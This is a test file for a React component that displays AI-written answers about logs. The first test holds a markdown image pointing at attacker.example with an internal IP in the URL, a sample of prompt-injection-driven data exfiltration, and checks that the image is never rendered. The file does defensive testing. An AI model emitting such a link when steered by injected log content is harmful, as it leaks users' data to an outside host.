import { render, screen } from '@testing-library/react'
import { MemoryRouter } from 'react-router'
import { describe, expect, it } from 'vitest'
import { AiAnswer } from './AiAnswer'

function renderAnswer(text: string) {
  return render(
    <MemoryRouter>
      <AiAnswer text={text} />
    </MemoryRouter>,
  )
}

describe('AiAnswer', () => {
  it('never renders images, so injected logs cannot exfiltrate data', () => {
    const { container } = renderAnswer(
      'See ![x](https://attacker.example/leak?d=10.0.0.5) for details',
    )
    expect(container.querySelector('img')).toBeNull()
  })

  it('links cited timestamps to the log list', () => {
    renderAnswer('Brute force seen at [2026-11-21T10:00:00Z].')
    const link = screen.getByRole('link', { name: '2026-11-21T10:00:00Z' })
    expect(link.getAttribute('href')).toContain('/logs?')
    expect(link.getAttribute('href')).toContain('focus=2026-11-21T10%3A00%3A00Z')
  })
})
